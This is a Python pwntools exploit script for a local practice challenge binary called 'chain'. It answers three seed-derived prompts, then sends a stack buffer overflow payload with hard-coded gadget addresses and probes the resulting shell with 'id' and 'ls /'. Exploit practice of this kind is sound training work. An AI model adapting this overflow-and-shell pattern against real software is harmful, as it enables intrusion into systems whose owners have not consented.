#!/usr/bin/env python3
import sys, re, time
from pwn import process, remote, p64, context
context.log_level = 'error'
M = 0xffffffff
def rol7(x):
    x &= M
    return ((x << 7) | (x >> 25)) & M

mode = sys.argv[1]
if mode == 'local':
    io = process(['./chain'], cwd='$HOME/pwnrange/chals/s1')
else:
    io = remote('127.0.0.1', int(sys.argv[2]))

d = io.recvuntil(b'A: '); print('[A]', d)
seed = int(re.search(rb'seed\s+([0-9a-fA-F]{1,8})', d).group(1), 16)
x1 = (seed * 0x9e3779b9) & M
io.sendline(('%08x' % x1).encode())
d = io.recvuntil(b'B: '); print('[B]', d)
x2 = rol7(x1) ^ 0x5a5a5a5a
io.sendline(('%08x' % x2).encode())
d = io.recvuntil(b'C: '); print('[C]', d)
vals = [int(v, 16) for v in re.findall(rb'([0-9a-fA-F]{8})', d.split(b'table:')[1])]
table = vals[:16]
i1, i2 = map(int, re.search(rb'idx\s+(\d+)\s+(\d+)', d).groups())
x3 = table[i1] ^ table[i2]
io.sendline(('%08x' % x3).encode())
g_want = rol7((x2 ^ x3) ^ 0x13371337)
print('[D]', io.recvuntil(b'D> '), 'g_want=%08x' % g_want)
payload = b'A'*0x48 + p64(0x4019ad) + p64(g_want) + p64(0x4019c5)
io.send(payload + b'\n')
time.sleep(0.3)
print('[after]', repr(io.recvrepeat(2.0)))
for c in [b'echo HELLO123', b'id', b'ls /']:
    print('>>>', c)
    try:
        io.send(c + b'\n')
    except Exception as e:
        print('send failed', e); break
    print('   ', repr(io.recvrepeat(2.0)))
io.close()
